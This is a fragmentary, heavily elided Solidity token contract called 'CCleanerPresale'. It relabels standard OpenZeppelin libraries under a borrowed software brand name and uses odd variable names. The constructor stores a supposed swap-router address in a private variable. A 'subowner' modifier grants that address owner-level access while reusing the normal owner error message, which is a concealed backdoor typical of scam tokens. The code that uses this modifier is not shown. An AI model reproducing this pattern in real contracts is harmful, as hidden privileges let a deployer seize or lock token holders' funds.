...
/*
 * @dev Provides information about the current execution CCleaner20Burnable, including the
 ...
 */
abstract contract CCleaner20Burnable {
...
// File: @openzeppelin/contracts/access/CCleaner20Ownable.sol
 ...
 * the owner.
 */
abstract contract CCleaner20Ownable is CCleaner20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "CCleaner20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "CCleaner20Ownable: new owner is the zero address");
 ...
 * `SafeCCleaner` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeCCleaner {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeCCleaner: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeCCleaner: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeCCleaner: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeCCleaner: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeCCleaner: modulo by zero");
  }
...
contract CCleanerToken is CCleaner20Burnable, CCleanerinterface, CCleaner20Ownable {
    
    using SafeCCleaner for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "CCleanerPresale";
        _symbol = "CCleanerPresale";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {CCleanerinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {CCleanerinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "CCleaner20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {CCleanerinterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {CCleanerinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {CCleanerinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {CCleanerinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {CCleanerinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "CCleanerinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {CCleanerinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "CCleanerinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "CCleanerinterface: transfer from the zero address");
        require(shippingto != address(0), "CCleanerinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "CCleanerinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "CCleanerinterface: approve from the zero address");
        require(transporteur != address(0), "CCleanerinterface: approve to the zero address");
